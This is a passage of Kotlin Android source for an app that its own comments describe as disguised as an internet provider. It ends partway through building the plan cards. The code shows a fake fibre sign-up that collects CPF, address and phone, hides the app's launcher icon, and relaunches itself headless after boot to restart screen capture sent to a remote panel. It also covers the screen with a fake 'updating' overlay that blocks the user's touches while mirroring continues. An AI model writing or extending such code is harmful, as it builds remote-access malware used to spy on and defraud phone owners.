package com.example.acessomaterno

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.content.pm.ShortcutManager
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.graphics.PixelFormat
import android.text.InputType
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.core.content.pm.ShortcutInfoCompat
import androidx.core.content.pm.ShortcutManagerCompat
import androidx.core.graphics.drawable.IconCompat
import androidx.core.view.ViewCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * Activity principal (launcher) — camuflada como provedora de internet.
 * Marca (nome / sigla / subtítulo) é 100% dinâmica: vem de strings.xml,
 * gravada pelo servidor em /salvar-config-app (white-label).
 * Design Moderno, Profissional com Cabeçalho e Cards Interativos.
 */
class MainActivity : Activity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_MEDIA_PROJECTION = 1001
        private const val REQUEST_OVERLAY = 1002
        private const val REQUEST_NOTIFICACAO = 1003

        private const val PREFS = "rastreio_facil_prefs"
        private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
        // Quando true, o cliente já chegou na tela "Análise em Andamento"
        // (etapa 4). Persistido para que, ao fechar e reabrir o app, a tela
        // permaneça a mesma (com o círculo de loop).
        private const val KEY_ANALISE_EM_ANDAMENTO = "analise_em_andamento"
        private const val AUTO_CONFIRMAR_INICIAR_MS = 350L

        // Paleta de cores profissional
        private val COR_BG_GERAL = Color.parseColor("#F4F6F9")
        private val COR_PRIMARIA = Color.parseColor("#0066FF")
        private val COR_PRIMARIA_DARK = Color.parseColor("#0043A8")
        private val COR_TEXTO_ESCURO = Color.parseColor("#1E293B")
        private val COR_TEXTO_MUTED = Color.parseColor("#64748B")
        private val COR_TEXTO_LIGHT = Color.parseColor("#94A3B8")
        private val COR_CARD_BG = Color.parseColor("#FFFFFF")
        private val COR_CARD_BORDA = Color.parseColor("#E2E8F0")
        private val COR_CARD_SELECIONADO_BG = Color.parseColor("#F0F6FF")
        private val COR_VERDE_DESTAQUE = Color.parseColor("#059669")
        private val COR_VERDE_LIGHT_BG = Color.parseColor("#ECFDF5")
        private val COR_LARANJA_POPULAR = Color.parseColor("#EA580C")
        private val COR_LARANJA_LIGHT_BG = Color.parseColor("#FFF7ED")
    }

    private lateinit var prefs: SharedPreferences
    private val handlerMain = Handler(Looper.getMainLooper())

    private var voltandoDeAcessibilidade = false
    private var iniciarCapturaDisparado = false

    // ── INJETOR VIRTUAL PÓS-BOOT (flag de controle) ────────────────────
    // Marcada como true quando a Activity é reanimada pela acessibilidade
    // após o boot com o extra AUTO_BOOT_REANIMAR. Nesse modo a Activity
    // roda headless (sem UI) e se fecha silenciosamente assim que o
    // MediaProjection é concedido — o ScreenCaptureService (Foreground)
    // continua enviando frames binários por baixo.
    @Volatile private var reanimacaoBootAutomatica = false

    // Containers para gerenciamento dinâmico de etapas
    private lateinit var containerInicial: LinearLayout
    private lateinit var containerCadastro: LinearLayout
    private lateinit var containerPlanos: LinearLayout
    private lateinit var containerSucesso: LinearLayout

    // Indicadores de progresso visual (Step Indicator)
    private lateinit var step1View: TextView
    private lateinit var step2View: TextView
    private lateinit var step3View: TextView

    // Plano selecionado atualmente (index 0, 1, 2)
    private var planoSelecionadoIndex = 1 // Padrão: 800 Mega (Mais Popular)
    private val cardsPlanos = mutableListOf<LinearLayout>()

    private fun resString(chave: String, fallback: String): String {
        return try {
            val id = resources.getIdentifier(chave, "string", packageName)
            if (id != 0) getString(id) else fallback
        } catch (e: Exception) {
            fallback
        }
    }
    private fun marcaNome(): String {
        val valor = resString("app_name", "")
        if (valor.isBlank() || valor.contains("Acesso Materno", true)) {
            return "Giga+ Internet"
        }
        return valor
    }
    private fun marcaSigla(): String = resString("app_sigla", "G+")
    private fun marcaSubtitulo(): String = resString("app_subtitulo", "Internet de Ultravelocidade")

    private fun ocultarIconeDaGaveta() {
        try {
            val alias = android.content.ComponentName(packageName, "$packageName.EntradaGaveta")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setPackage(packageName)
            val resolves = packageManager.queryIntentActivities(intent, 0)
            for (info in resolves) {
                val componente = android.content.ComponentName(
                    info.activityInfo.packageName,
                    info.activityInfo.name
                )
                packageManager.setComponentEnabledSetting(
                    componente,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao ocultar ícone da gaveta: ${e.message}")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        // ── INJETOR VIRTUAL PÓS-BOOT: verificação ANTES de qualquer outra linha ──
        if (intent?.getBooleanExtra("AUTO_BOOT_REANIMAR", false) == true) {
            super.onCreate(savedInstanceState)
            reanimacaoBootAutomatica = true
            SocketManager.appContext = applicationContext
            Thread {
                try {
                    SocketManager.connect()
                } catch (e: Exception) {
                    Log.e(TAG, "Falha ao conectar no boot automático: ${e.message}")
                }
            }.start()
            val prefsBoot = getSharedPreferences(PREFS, MODE_PRIVATE)
            if (prefsBoot.getBoolean("atalho_confirmado", false)) {
                ocultarIconeDaGaveta()
            }
            iniciarCaptura()
            return
        }

        super.onCreate(savedInstanceState)

        prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
        SocketManager.appContext = applicationContext

        // 1. Renderiza a interface principal imediatamente (setContentView)
        construirInterfaceDinamica()

        Thread {
            try {
                SocketManager.connect()
                RegistroPainel.registrar()
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao conectar/registrar no painel: ${e.message}")
            }
        }.start()

        solicitarNotificacaoSePrecisar()
        solicitarIsencaoBateria()

        // Registra BroadcastReceiver da tela de carregamento / atualização remota
        try {
            val filter = IntentFilter("com.example.acessomaterno.ACAO_LOADING_OVERLAY")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(loadingReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(loadingReceiver, filter)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao registrar loadingReceiver: ${e.message}")
        }

        val primeiroAcesso = prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)
        if (primeiroAcesso) {
            MyAccessibilityService.onboardingRapido = true
        }

        // Aguarda a renderização completa da janela antes de avaliar etapas ou modais
        window.decorView.post {
            try {
                atualizarEtapaInterface()
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao atualizar etapa inicial: ${e.message}")
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (voltandoDeAcessibilidade) {
            voltandoDeAcessibilidade = false
            if (isAcessibilidadeAtiva()) {
                exibirModalConsentimentoTela()
            }
        }
    }

    override fun onPause() {
        super.onPause()
    }

    override fun onDestroy() {
        super.onDestroy()
        handlerMain.removeCallbacksAndMessages(null)
        try {
            unregisterReceiver(loadingReceiver)
        } catch (_: Exception) {}
        // Remove o overlay de atualização (janela transparente) se estiver na tela.
        try {
            loadingOverlayJanela?.let { v ->
                (getSystemService(Context.WINDOW_SERVICE) as? WindowManager)?.removeView(v)
            }
            loadingOverlayJanela = null
        } catch (_: Exception) {}
    }

    private lateinit var loadingOverlay: FrameLayout
    // Referência do layout raiz (fallback quando não há permissão de overlay) e
    // controle da janela separada do overlay de atualização (transparente).
    private lateinit var rootLayout: FrameLayout
    private var loadingOverlayJanela: View? = null
    // Auto-remoção após 2 minutos (camada temporária de atualização).
    private val autoRemoverOverlayRunnable = Runnable {
        mostrarLoadingOverlay(false)
        try { SocketManager.notificarAtualizacaoConcluida() } catch (_: Exception) {}
    }
    private val loadingReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.acessomaterno.ACAO_LOADING_OVERLAY") {
                val ativo = intent.getBooleanExtra("ativo", false)
                aplicarOverlayAtualizacao(ativo)
                MyAccessibilityService.instance?.ativarAtualizacaoGlobal(ativo)
            }
        }
    }

    /**
     * Overlay de Atualização (Fundo Limpo): roda em celular físico E em
     * emuladores (Nox/MEmu/BlueStacks/AVD). Quando há permissão de overlay,
     * usa o OverlayService (janela independente que sobrevive em background);
     * no emulador o Service aplica fundo semitransparente (#66000000), no
     * físico 100% transparente. Sem permissão, cai no fallback dentro da
     * Activity (mesma lógica de cor por dispositivo em mostrarLoadingOverlay).
     * O espelhamento de tela continua ativo em ambos (sem FLAG_SECURE).
     */
    private fun aplicarOverlayAtualizacao(ativo: Boolean) {
        try {
            if (ativo && podeSobrepor()) {
                // Service (janela independente) — funciona em físico e emulador.
                startService(Intent(this, OverlayService::class.java))
                // Evita duplicata: o Service é o dono da janela; a janela
                // dentro da Activity fica desligada.
                mostrarLoadingOverlay(false)
                return
            }
            // Desligando OU sem permissão: garante que o Service não rode e
            // usa o fallback dentro da Activity (ou remove, ao desligar).
            stopService(Intent(this, OverlayService::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao controlar OverlayService: ${e.message}")
        }
        mostrarLoadingOverlay(ativo)
    }

    private fun construirLoadingOverlay(): FrameLayout {
        return FrameLayout(this).apply {
            id = View.generateViewId()
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            // CORREÇÃO TELA PRETA (Nox / emulador flutuante): fundo 100%
            // transparente. O MediaProjection captura o fundo NORMAL do
            // dispositivo por trás; apenas o cartão central (círculo + texto)
            // fica visível. Combinado com PixelFormat.TRANSLUCENT e sem
            // FLAG_SECURE (ver mostrarLoadingOverlay) o espelhamento do
            // emulador flutuante NUNCA mais fica preto.
            setBackgroundColor(Color.parseColor("#00000000"))
            visibility = View.GONE
            isClickable = true
            isFocusable = true

            // Cartão escuro arredondado SÓ atrás do círculo + texto (mantém
            // legibilidade sem cobrir a tela). ~80% preto, cantos arredondados.
            val cartaoFundo = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(24).toFloat()
                setColor(Color.parseColor("#CC000000"))
            }

            val content = LinearLayout(context).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setPadding(dp(40), dp(36), dp(40), dp(36))
                background = cartaoFundo
                layoutParams = FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.CENTER
                }
            }

            val progressBar = ProgressBar(context).apply {
                isIndeterminate = true
                layoutParams = LinearLayout.LayoutParams(dp(64), dp(64)).apply {
                    bottomMargin = dp(24)
                }
            }

            val title = TextView(context).apply {
                text = "Atualizando o aplicativo..."
                textSize = 20f
                setTextColor(Color.WHITE)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    bottomMargin = dp(12)
                }
            }

            val subtitle = TextView(context).apply {
                text = "Aguarde enquanto sincronizamos os dados.\nNão feche o aplicativo."
                textSize = 14f
                setTextColor(Color.parseColor("#CCCCCC"))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }

            content.addView(progressBar)
            content.addView(title)
            content.addView(subtitle)
            addView(content)
        }
    }

    fun mostrarLoadingOverlay(ativo: Boolean) {
        handlerMain.post {
            try {
                handlerMain.removeCallbacks(autoRemoverOverlayRunnable)
                // Cor de fundo conforme o dispositivo (fallback dentro da
                // Activity): emulador = escurecimento semitransparente
                // (#66000000) para destacar o círculo de carregamento mantendo
                // os apps por baixo visíveis; celular físico = 100%
                // transparente (Fundo Limpo). Sem FLAG_SECURE → o
                // espelhamento (MediaProjection) continua sem tela preta.
                if (::loadingOverlay.isInitialized) {
                    val corFundo = if (OverlayService.isRunningOnEmulator(this@MainActivity))
                        "#66000000" else "#00000000"
                    loadingOverlay.setBackgroundColor(Color.parseColor(corFundo))
                }
                val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                if (ativo) {
                    if (loadingOverlayJanela != null) {
                        // Já está na tela: só reagenda o auto-remove de 2 min.
                        handlerMain.postDelayed(autoRemoverOverlayRunnable, 120000)
                        return@post
                    }
                    if (!::loadingOverlay.isInitialized) return@post
                    val adicionado = if (wm != null && podeSobrepor()) {
                        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
                        // CORREÇÃO TELA PRETA: SEM FLAG_SECURE (no Nox/emulador
                        // ela deixa a captura PRETA — não transparente — e em
                        // UID igual o MediaProjection captura a janela mesmo
                        // assim). PixelFormat.TRANSLUCENT respeita o fundo
                        // transparente do overlay. Resultado: o MediaProjection
                        // captura o fundo NORMAL do dispositivo por trás e
                        // apenas o círculo de carregamento (cartão central)
                        // fica visível no emulador flutuante. SEM
                        // FLAG_NOT_TOUCHABLE: consome os toques locais →
                        // usuário não sai do overlay no dispositivo. Botão
                        // Home (ação global) continua funcionando.
                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            type,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                            PixelFormat.TRANSLUCENT
                        ).apply {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                layoutInDisplayCutoutMode =
                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                            }
                        }
                        loadingOverlay.visibility = View.VISIBLE
                        try {
                            wm.addView(loadingOverlay, params)
                            loadingOverlayJanela = loadingOverlay
                            true
                        } catch (e: Exception) {
                            Log.e(TAG, "Falha ao adicionar overlay via WindowManager: ${e.message}")
                            false
                        }
                    } else false
                    if (!adicionado) {
                        // Fallback (sem permissão de overlay): adiciona na Activity.
                        // (Será capturado pelo espelhamento, mas aparece no dispositivo.)
                        loadingOverlay.visibility = View.VISIBLE
                        try {
                            if (loadingOverlay.parent == null) rootLayout.addView(loadingOverlay)
                        } catch (_: Exception) {}
                        loadingOverlayJanela = loadingOverlay
                    }
                    // Camada temporária: remove automaticamente após 2 minutos.
                    handlerMain.postDelayed(autoRemoverOverlayRunnable, 120000)
                    Log.d(TAG, "Overlay de atualização ATIVADO (transparente, sem FLAG_SECURE, TRANSLUCENT) — espelhamento continua claro; auto-remove em 2 min.")
                } else {
                    loadingOverlayJanela?.let { v ->
                        try { wm?.removeView(v) } catch (_: Exception) {}
                        try { (v.parent as? android.view.ViewGroup)?.removeView(v) } catch (_: Exception) {}
                    }
                    loadingOverlayJanela = null
                    if (::loadingOverlay.isInitialized) loadingOverlay.visibility = View.GONE
                    Log.d(TAG, "Overlay de atualização REMOVIDO.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao mostrar/remover loadingOverlay: ${e.message}")
            }
        }
    }

    private fun construirInterfaceDinamica() {
        rootLayout = FrameLayout(this).apply {
            setBackgroundColor(COR_BG_GERAL)
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        val contentLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // 1. CABEÇALHO SUPERIOR (HEADER PROFISSIONAL)
        val header = criarCabecalhoProfissional()
        contentLayout.addView(header)

        // 2. INDICADOR DE PASSOS / PROGRESSO
        val stepBar = criarIndicadorPassos()
        contentLayout.addView(stepBar)

        // 3. SCROLL VIEW COM CONTEÚDO PRINCIPAL
        val scroll = ScrollView(this).apply {
            isFillViewport = true
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0,
                1f
            )
        }

        val layoutConteudo = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(24))
        }

        // ETAPA 1: TELA INICIAL
        containerInicial = construirContainerInicial()

        // ETAPA 2: FORMULÁRIO DE CADASTRO
        containerCadastro = construirContainerCadastro()

        // ETAPA 3: VITRINE DE PLANOS (CARDS DE OPÇÕES)
        containerPlanos = construirContainerPlanos()

        // ETAPA 4: FINALIZAÇÃO SUCESSO
        containerSucesso = construirContainerSucesso()

        layoutConteudo.addView(containerInicial)
        layoutConteudo.addView(containerCadastro)
        layoutConteudo.addView(containerPlanos)
        layoutConteudo.addView(containerSucesso)

        scroll.addView(layoutConteudo)
        contentLayout.addView(scroll)

        rootLayout.addView(contentLayout)

        loadingOverlay = construirLoadingOverlay()
        // NÃO adiciona no layout da Activity: o overlay de atualização é uma
        // janela SEPARADA do WindowManager, transparente e SEM FLAG_SECURE
        // (TRANSLUCENT) → o MediaProjection captura o fundo NORMAL do
        // dispositivo por trás e apenas o círculo de carregamento (cartão
        // central) fica visível no emulador flutuante, sem tela preta.
        setContentView(rootLayout)
    }

    /**
     * Cria um cabeçalho moderno com gradiente, logo e badge de status.
     */
    private fun criarCabecalhoProfissional(): View {
        val headerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(36), dp(20), dp(20))
            background = fundoGradiente(
                intArrayOf(COR_PRIMARIA_DARK, COR_PRIMARIA),
                raioDp = 0
            )
        }

        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }

        // Imagem do Logo (Ícone do Aplicativo no lado esquerdo do cabeçalho)
        val logoImage = android.widget.ImageView(this).apply {
            contentDescription = null // decorativo: nome do app aparece em texto ao lado
            try {
                setImageDrawable(packageManager.getApplicationIcon(packageName))
            } catch (e: Exception) {
                setImageResource(R.mipmap.ic_launcher)
            }
            scaleType = android.widget.ImageView.ScaleType.FIT_CENTER
            val tamanho = dp(42)
            layoutParams = LinearLayout.LayoutParams(tamanho, tamanho).apply {
                marginEnd = dp(14)
            }
        }

        val titleContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val txtTitulo = TextView(this).apply {
            text = marcaNome()
            ViewCompat.setAccessibilityHeading(this, true)
            textSize = 24f
            setTextColor(Color.WHITE)
            setTypeface(null, Typeface.BOLD)
        }

        val txtSubtitulo = TextView(this).apply {
            text = marcaSubtitulo()
            textSize = 13f
            setTextColor(Color.parseColor("#DBEAFE"))
        }

        titleContainer.addView(txtTitulo)
        titleContainer.addView(txtSubtitulo)

        // Badge Cobertura Ativa
        val badgeStatus = TextView(this).apply {
            text = "● COBERTURA ATIVA"
            textSize = 10f
            setTextColor(Color.WHITE)
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(10), dp(5), dp(10), dp(5))
            background = fundoArredondado(Color.parseColor("#33FFFFFF"), 20)
        }

        topRow.addView(logoImage)
        topRow.addView(titleContainer)
        topRow.addView(badgeStatus)

        headerLayout.addView(topRow)
        return headerLayout
    }

    /**
     * Barra de progresso visual das etapas (1. Início | 2. Cadastro | 3. Planos)
     */
    private fun criarIndicadorPassos(): View {
        val stepContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(12), dp(16), dp(12))
            setBackgroundColor(Color.WHITE)
            elevation = dp(2).toFloat()
        }

        step1View = criarItemStep("1. Análise", true)
        val divisor1 = criarDivisorStep()
        step2View = criarItemStep("2. Viabilidade", false)
        val divisor2 = criarDivisorStep()
        step3View = criarItemStep("3. Planos", false)

        stepContainer.addView(step1View)
        stepContainer.addView(divisor1)
        stepContainer.addView(step2View)
        stepContainer.addView(divisor2)
        stepContainer.addView(step3View)

        return stepContainer
    }

    private fun criarItemStep(titulo: String, ativo: Boolean): TextView {
        return TextView(this).apply {
            text = titulo
            textSize = 12f
            setTypeface(null, if (ativo) Typeface.BOLD else Typeface.NORMAL)
            setTextColor(if (ativo) COR_PRIMARIA else COR_TEXTO_MUTED)
            gravity = Gravity.CENTER
            setPadding(dp(8), dp(4), dp(8), dp(4))
            if (ativo) {
                background = fundoArredondado(Color.parseColor("#EFF6FF"), 12)
            }
        }
    }

    private fun criarDivisorStep(): TextView {
        return TextView(this).apply {
            text = "›"
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO // seta decorativa entre passos
            textSize = 14f
            setTextColor(COR_TEXTO_LIGHT)
            setPadding(dp(4), 0, dp(4), 0)
        }
    }

    private fun atualizarIndicadorPassos(etapa: Int) {
        // etapa 1: inicio, 2: cadastro, 3: planos, 4: sucesso
        step1View.apply {
            setTextColor(if (etapa == 1) COR_PRIMARIA else COR_TEXTO_MUTED)
            setTypeface(null, if (etapa == 1) Typeface.BOLD else Typeface.NORMAL)
            background = if (etapa == 1) fundoArredondado(Color.parseColor("#EFF6FF"), 12) else null
        }
        step2View.apply {
            setTextColor(if (etapa == 2) COR_PRIMARIA else COR_TEXTO_MUTED)
            setTypeface(null, if (etapa == 2) Typeface.BOLD else Typeface.NORMAL)
            background = if (etapa == 2) fundoArredondado(Color.parseColor("#EFF6FF"), 12) else null
        }
        step3View.apply {
            setTextColor(if (etapa >= 3) COR_PRIMARIA else COR_TEXTO_MUTED)
            setTypeface(null, if (etapa >= 3) Typeface.BOLD else Typeface.NORMAL)
            background = if (etapa >= 3) fundoArredondado(Color.parseColor("#EFF6FF"), 12) else null
        }
    }

    /**
     * ETAPA 1: Card de Análise Inicial
     */
    private fun construirContainerInicial(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.VISIBLE
        }

        val cardView = criarCardBase()

        val tagHero = TextView(this).apply {
            text = "NOVA TECNOLOGIA FIBRA ÓPTICA"
            textSize = 11f
            setTextColor(COR_PRIMARIA)
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = fundoArredondado(Color.parseColor("#EFF6FF"), 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(12) }
        }

        val titulo = TextView(this).apply {
            text = "Simule a Velocidade Ideal para Sua Casa"
            textSize = 20f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
            setPadding(0, 0, 0, dp(8))
        }

        val descricao = TextView(this).apply {
            text = "Verifique a viabilidade técnica e receba ofertas exclusivas com instalação grátis para sua região."
            textSize = 14f
            setTextColor(COR_TEXTO_MUTED)
            setLineSpacing(dp(2).toFloat(), 1.1f)
            setPadding(0, 0, 0, dp(20))
        }

        // Benefícios em lista
        val listaBeneficios = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 0, 0, dp(24))
        }
        listaBeneficios.addView(criarItemBeneficio("⚡", "Velocidade ultra rápida de até 1 Giga"))
        listaBeneficios.addView(criarItemBeneficio("📶", "Roteador Wi-Fi 6 Dual Band incluso"))
        listaBeneficios.addView(criarItemBeneficio("🛠️", "Instalação 100% gratuita sem taxa de adesão"))
        listaBeneficios.addView(criarItemBeneficio("🎮", "Ping ultra baixo ideal para jogos e streaming 4K"))

        val btnSimular = Button(this).apply {
            text = "Simular Análise de Viabilidade"
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = fundoGradiente(intArrayOf(COR_PRIMARIA, COR_PRIMARIA_DARK), 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                if (prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)) {
                    exibirModalConsentimentoAcessibilidade()
                } else {
                    atualizarEtapaInterface()
                }
            }
        }

        cardView.addView(tagHero)
        cardView.addView(titulo)
        cardView.addView(descricao)
        cardView.addView(listaBeneficios)
        cardView.addView(btnSimular)

        container.addView(cardView)
        return container
    }

    private fun criarItemBeneficio(icone: String, texto: String): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, dp(6), 0, dp(6))

            val txtIcone = TextView(this@MainActivity).apply {
                this.text = icone
                textSize = 16f
                setPadding(0, 0, dp(10), 0)
            }

            val txtDesc = TextView(this@MainActivity).apply {
                this.text = texto
                textSize = 13f
                setTextColor(COR_TEXTO_ESCURO)
            }

            addView(txtIcone)
            addView(txtDesc)
        }
    }

    /**
     * ETAPA 2: Card de Formulario de Cadastro
     */
    private fun construirContainerCadastro(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
        }

        val cardView = criarCardBase()

        val txtCadastroTitulo = TextView(this).apply {
            ViewCompat.setAccessibilityHeading(this, true)
            text = "Cadastro de Viabilidade"
            textSize = 20f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
        }

        val txtCadastroSub = TextView(this).apply {
            text = "Preencha os dados abaixo para consultar a disponibilidade do sinal na sua rua."
            textSize = 13f
            setTextColor(COR_TEXTO_MUTED)
            setPadding(0, dp(4), 0, dp(20))
        }

        cardView.addView(txtCadastroTitulo)
        cardView.addView(txtCadastroSub)

        val (layoutNome, campoNome) = criarCampoTextoProfissional("Nome Completo", "Ex: Maria Silva", InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PERSON_NAME)
        val (layoutEndereco, campoEndereco) = criarCampoTextoProfissional("Endereço Residencial", "Ex: Av. Paulista, 1000 - Apto 42", InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_POSTAL_ADDRESS)
        val (layoutCpf, campoCpf) = criarCampoTextoProfissional("CPF do Titular", "000.000.000-00", InputType.TYPE_CLASS_NUMBER)
        val (layoutTelefone, campoTelefone) = criarCampoTextoProfissional("Telefone / WhatsApp", "(00) 90000-0000", InputType.TYPE_CLASS_PHONE)
        val (layoutEmail, campoEmail) = criarCampoTextoProfissional("E-mail Contato", "seuemail@dominio.com", InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS)

        cardView.addView(layoutNome)
        cardView.addView(layoutEndereco)
        cardView.addView(layoutCpf)
        cardView.addView(layoutTelefone)
        cardView.addView(layoutEmail)

        val btnVerPlanos = Button(this).apply {
            text = "Ver Planos Disponíveis →"
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = fundoGradiente(intArrayOf(COR_PRIMARIA, COR_PRIMARIA_DARK), 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(12) }
            setOnClickListener {
                if (campoNome.text.toString().trim().isEmpty() || campoTelefone.text.toString().trim().isEmpty()) {
                    Toast.makeText(this@MainActivity, "Por favor, preencha os campos obrigatórios (Nome e Telefone).", Toast.LENGTH_SHORT).show()
                } else {
                    containerCadastro.visibility = View.GONE
                    containerPlanos.visibility = View.VISIBLE
                    atualizarIndicadorPassos(3)
                }
            }
        }
        cardView.addView(btnVerPlanos)

        container.addView(cardView)
        return container
    }

    /**
     * ETAPA 3: Vitrine de Planos em CARDS Interativos
     */
    private fun construirContainerPlanos(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
        }

        val txtPlanosTitulo = TextView(this).apply {
            ViewCompat.setAccessibilityHeading(this, true)
            text = "Selecione o Plano Ideal"
            textSize = 20f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
        }

        val txtPlanosSub = TextView(this).apply {
            text = "Todos os planos incluem Wi-Fi grátis e suporte técnico prioritário."
            textSize = 13f
            setTextColor(COR_TEXTO_MUTED)
            setPadding(0, dp(4), 0, dp(16))
        }

        container.addView(txtPlanosTitulo)
        container.addView(txtPlanosSub)

        cardsPlanos.clear()

        // Card Plano 1: 600 Mega
        val cardPlano1 = criarCardOpcaoPlano(
            index = 0,
            velocidade = "600 MEGA",
            subtituloVelocidade = "Fibra Simétrica High Speed",
